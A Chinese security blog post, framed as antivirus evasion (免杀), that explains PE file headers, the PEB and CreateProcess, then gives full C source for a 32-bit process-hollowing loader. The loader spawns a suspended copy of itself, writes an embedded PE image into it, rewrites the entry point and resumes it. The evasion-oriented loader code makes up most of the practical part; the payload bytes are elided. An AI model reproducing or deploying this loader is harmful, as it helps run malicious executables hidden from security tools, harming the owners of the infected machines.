<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【免杀】内存加载PE文件</title><meta name="description" content="&lt;p&gt;使用windows API编写PE文件加载器（Loader）&lt;br /&gt;
目前支支持32位&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【免杀】内存加载PE文件</h3><div class="article__date metadata"><div class="post-info">2023/06/13</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/malware/">malware</a><a class="article__tags__link metadata" href="/tags/C/">C</a></div><div class="article__body"><p>使用windows API编写PE文件加载器（Loader）<br />
目前支支持32位</p>
<span id="more"></span>
<h1 id="pe文件结构"><a class="markdownIt-Anchor" href="#pe文件结构"></a> PE文件结构</h1>
<p>在《逆向工程核心原理》中讲的已经很详细了，这里主要面向32位的可执行程序来讲解。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0cdf49890a47067a93b43fd16ec19448.png" alt="MZ" /></p>
<p>DOS头和PE头统称为PE头，下面的部分称之为PE体。</p>
<h2 id="dos头"><a class="markdownIt-Anchor" href="#dos头"></a> DOS头</h2>
<p>DOS头的文件结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// 文件最后一页的字节数</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// 文件中的页数</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// 重定位</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// 段中头大小</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// 需要最少的额外段落</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// 需要最多的额外段落</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// 初始（相对）SS 值</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// 初始SP值</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// 初始 IP 值</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// 初始（相对）CS 值</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// 重定位表的文件地址</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// 叠加数</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// 保留字</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM 标识符（用于 e_oeminfo）</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM信息； e_oemid 具体</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// 保留字</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// 新exe头文件地址</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>
<p>其中DOS头有一个很重要的部分<code>e_lfanew</code>，他指向了exe的文件头，在我们编写的loader获取头的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOSHeader = PIMAGE_DOS_HEADER(Image);								<span class="comment">//得到DOS头</span></span><br><span class="line">NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);	<span class="comment">//得到PE头</span></span><br></pre></td></tr></table></figure>
<h2 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h2>
<p>那么关于NT文件头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;						<span class="comment">//文件类型</span></span><br><span class="line">                    <span class="comment">// IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE                 0x454E      // NE</span></span><br><span class="line">                    <span class="comment">// IMAGE_OS2_SIGNATURE_LE              0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_VXD_SIGNATURE                 0x454C      // LE</span></span><br><span class="line">                    <span class="comment">// IMAGE_NT_SIGNATURE                  0x00004550  // PE00</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p>这个文件头很关键，Signature可以判断类型，FileHeader即文件头，可以从<code>NumberOfSections</code>获得节区数目。</p>
<p>OPTIONAL_HEADER结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>
<p>OPTIONAL_HEADER中记载了很多详细信息，其中有用的就是<code>ImageBase</code>、<code>SizeOfHeaders</code>和<code>AddressOfEntryPoint</code></p>
<ul>
<li><code>ImageBase</code>：描写在虚拟内存中（不了解操作系统的话可以理解为程序启动的基地址）的地址</li>
<li><code>SizeOfHeaders</code>：记录了整个PE头的大小（包含DOS头），方便控制写入程序的大小</li>
<li><code>AddressOfEntryPoint</code>：<strong>记录程序入口代码起始地址</strong>，比如<code>ImageBase</code>可能为0x4000，<code>AddressOfEntryPoint</code>可能为0x4100。</li>
</ul>
<h2 id="iat导入表"><a class="markdownIt-Anchor" href="#iat导入表"></a> IAT导入表</h2>
<p>Windows为了知道使用了那些函数，会导入这些函数的表，从导入表到动态链接中查找函数。每一个节都会有一个导入表，每一个表的信息有40字节，那么找到表的地址就是<code>base + count*40</code>，其中<code>base</code>为<code>DOSHeader-&gt;e_lfanew+248</code>，这里是导入表的初始地址的指针。</p>
<h1 id="进程结构"><a class="markdownIt-Anchor" href="#进程结构"></a> 进程结构</h1>
<h2 id="pre-peb"><a class="markdownIt-Anchor" href="#pre-peb"></a> Pre- PEB</h2>
<p>这部分是铺垫的内容，主要描述的就是几个基础寄存器。</p>
<p>这些寄存器是CPU中设计好的，</p>
<ul>
<li>CS (Code Segment Register)：代码段的段基址</li>
<li>DS(Data Segment Register)：数据段的段基址</li>
<li>ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。</li>
<li>FS(Extra Segment Register)：其值为附加数据段的段基值</li>
<li>GS：同上</li>
<li>SS(Stack Segment Register)：堆栈段寄存器</li>
</ul>
<ol>
<li>在实模式中，CS、DS、ES、SS中的值是物理地址</li>
<li>在保护模式中，装入寄存器的是<strong>段选择子FS</strong></li>
</ol>
<p>其中最重要的就是 <strong>FS寄存器</strong>。在保护模式下，x86处理器使用段描述符来管理内存，将内存划分为不同的段，如代码段、数据段、堆栈段等。段选择子是一个16位的值，用于标识特定段的起始地址和访问权限。</p>
<p>FS寄存器主要有两个作用：</p>
<ol>
<li>定位线程局部存储（Thread Local Storage，TLS）：
<ul>
<li>在多线程程序中，每个线程通常都有自己的TLS，用于存储线程本地的数据，如线程特定变量。</li>
<li>FS寄存器中存储了一个特殊的段选择子，用于定位线程的TLS。</li>
<li>线程可以通过访问FS寄存器来访问自己的TLS。</li>
</ul>
</li>
<li>访问段描述符表（Global Descriptor Table，GDT）：
<ul>
<li>GDT是一个表格，用于存储段描述符的信息，包括段的起始地址、大小、访问权限等。</li>
<li>FS寄存器中存储了GDT中的一个段选择子，该段选择子指向了一个描述线程局部存储段的段描述符。</li>
<li>当线程需要访问TLS时，通过访问FS寄存器中的段选择子，可以获得TLS的起始地址和访问权限。</li>
</ul>
</li>
</ol>
<h2 id="peb"><a class="markdownIt-Anchor" href="#peb"></a> PEB</h2>
<p>PEB全称是 Process Environment Block，进程环境块</p>
<p>为了获取PEB的消息可以直接从FS段选择子找到TEB（线程环境块），再从TEB找到PEB，这里可以<code>CTX-&gt;Ebx + 8</code>找到PEB</p>
<h2 id="编程相关"><a class="markdownIt-Anchor" href="#编程相关"></a> 编程相关</h2>
<p>创建一个进程我们可以使用<code>CreateProcess</code>函数</p>
<blockquote>
<p>新进程在调用进程的安全上下文中运行。</p>
<p>如果调用进程正在模拟其他用户，则新进程将令牌用于调用进程，而不是模拟令牌。 若要在模拟令牌表示的用户的安全上下文中运行新进程，请使用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a> 或 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW</a> 函数。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcessA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><br><span class="line"><span class="params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]                BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  [in]                DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  [in, optional]      LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="line"><span class="params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>lpApplicationName</code>：exe的文件路径，比如<code>c:\test.exe</code></p>
</li>
<li>
<p><code>lpCommandLine</code>：要执行该程序时的参数</p>
</li>
<li>
<p><code>bInheritHandles</code>：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。 如果参数为 FALSE，则不继承句柄。</p>
</li>
<li>
<p><code>dwCreationFlags</code>：控制优先级类和进程的<strong>创建的标志</strong>。</p>
</li>
<li>
<p><code>lpProcessInformation</code>：进程信息</p>
<p>windows中使用<code>PROCESS_INFORMATION</code>描述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    HANDLE hProcess;	<span class="comment">//新创建的进程的句柄。 句柄用于在对进程对象执行操作的所有函数中指定进程。</span></span><br><span class="line">    HANDLE hThread;		<span class="comment">//新创建的进程的主线程的句柄。 句柄用于在线程对象上执行操作的所有函数中指定线程。</span></span><br><span class="line">    DWORD dwProcessId;	<span class="comment">//可用于标识进程的值。 从创建进程到进程的所有句柄关闭并释放进程对象为止，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">    DWORD dwThreadId;	<span class="comment">//可用于标识线程的值。 在线程创建到线程的所有句柄关闭且线程对象释放之前，该值有效;此时，可以重复使用标识符。</span></span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>lpStartupInfo</code>：启动时的信息</p>
<p>同时如果要开启一个进程的话需要向其提供基础环境，windows中为<code>STARTUPINFOA</code>，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">    DWORD   cb;				<span class="comment">//结构大小（以字节为单位）。</span></span><br><span class="line">    LPSTR   lpReserved;		<span class="comment">//保留;必须为 NULL</span></span><br><span class="line">    ...</span><br><span class="line">    DWORD   dwFlags;		<span class="comment">//一个位字段，用于确定进程创建窗口时是否使用某些 STARTUPINFO 成员。 此成员可以是以下一个或多个值。</span></span><br><span class="line">    <span class="comment">//参考 https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa</span></span><br><span class="line">   ...</span><br><span class="line">    WORD    cbReserved2;	<span class="comment">//保留供 C 运行时使用;必须为零。</span></span><br><span class="line">    LPBYTE  lpReserved2;	<span class="comment">//保留供 C 运行时使用;必须为 NULL。</span></span><br><span class="line">    HANDLE  hStdInput;</span><br><span class="line">    HANDLE  hStdOutput;</span><br><span class="line">    HANDLE  hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>最后创建好的进程就在<code>lpProcessInformation</code>的<code>hProcess</code>中了</p>
<h1 id="编写loader进程镂空"><a class="markdownIt-Anchor" href="#编写loader进程镂空"></a> 编写Loader（进程镂空）</h1>
<p>知道了加载过程，那么</p>
<ol>
<li>获得DOS头，从而获得NT头</li>
<li>检查是否为正确的文件格式（PE）</li>
<li>初始化进程信息和启动时信息</li>
<li>创建当前程序进程的副本，并将副本设置为暂停</li>
<li>根据上下文信息找到导入表和PEB</li>
<li>复制导入表和PEB，将EAX设置为待加载PE文件的入口地址<code>DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</code></li>
<li>恢复暂停的副本，运行加载的PE文件</li>
</ol>
<p><img src="https://cdn-images.postach.io/1048057d-e83d-423e-a47b-f4c6f4737870/b9621a0e-f58d-43f9-8b52-331139f11008/8f876f09-767b-46d4-a370-627f87733e68.png" alt="img" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">RunPe</span><span class="params">(HANDLE Image)</span></span><br><span class="line">&#123;</span><br><span class="line">	IMAGE_DOS_HEADER* DOSHeader;	<span class="comment">//DOS文件头</span></span><br><span class="line">	IMAGE_NT_HEADERS* NTHeader;	<span class="comment">//PE文件头</span></span><br><span class="line">	IMAGE_SECTION_HEADER* SectionHeader;	<span class="comment">//节头</span></span><br><span class="line"></span><br><span class="line">	PROCESS_INFORMATION PI;		<span class="comment">//进程信息</span></span><br><span class="line">	STARTUPINFOA SI;			<span class="comment">//启动信息</span></span><br><span class="line"></span><br><span class="line">	DWORD* ImageBase;			<span class="comment">//VAR基地址</span></span><br><span class="line">	<span class="type">void</span>* pImageBase;			<span class="comment">//指向头的指针</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> count;</span><br><span class="line">	<span class="type">char</span> FilePath[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">	DOSHeader = PIMAGE_DOS_HEADER(Image);								<span class="comment">//得到DOS头</span></span><br><span class="line">	NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew);	<span class="comment">//得到PE头</span></span><br><span class="line">	</span><br><span class="line">	GetModuleFileNameA(<span class="number">0</span>, FilePath, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;					<span class="comment">//检查是否为PE文件</span></span><br><span class="line">		ZeroMemory(&amp;PI, <span class="keyword">sizeof</span>(PI));</span><br><span class="line">		ZeroMemory(&amp;SI, <span class="keyword">sizeof</span>(SI));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CreateProcessA(FilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">			CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;					<span class="comment">//创建当前进程的暂停副本</span></span><br><span class="line">			CONTEXT *CTX = PCONTEXT(VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">			CTX-&gt;ContextFlags = CONTEXT_FULL;							<span class="comment">//创建上下文</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123;			<span class="comment">//如果上下文在线程中</span></span><br><span class="line">				<span class="comment">//读取指令</span></span><br><span class="line">				ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + <span class="number">8</span>), LPVOID(&amp;ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase),</span><br><span class="line">					NTHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 向进程的暂停副本写入指令</span></span><br><span class="line">				WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+<span class="number">248</span>+(count*<span class="number">40</span>));</span><br><span class="line">					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),</span><br><span class="line">						LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + <span class="number">8</span>),</span><br><span class="line">					LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//将入口地址放入EAX寄存器</span></span><br><span class="line">				CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">				SetThreadContext(PI.hThread, LPCONTEXT(CTX));</span><br><span class="line">				ResumeThread(PI.hThread);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rawData[<span class="number">91209</span>] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	RunPe(rawData);</span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d594572b354d7f3a546c13620b64d316.png" alt="result" /></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/06/14/windows-kernel-2-process&amp;thread/">prev_post</a><a class="pagination__link pagination__next" href="/2023/06/01/web-0x2/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>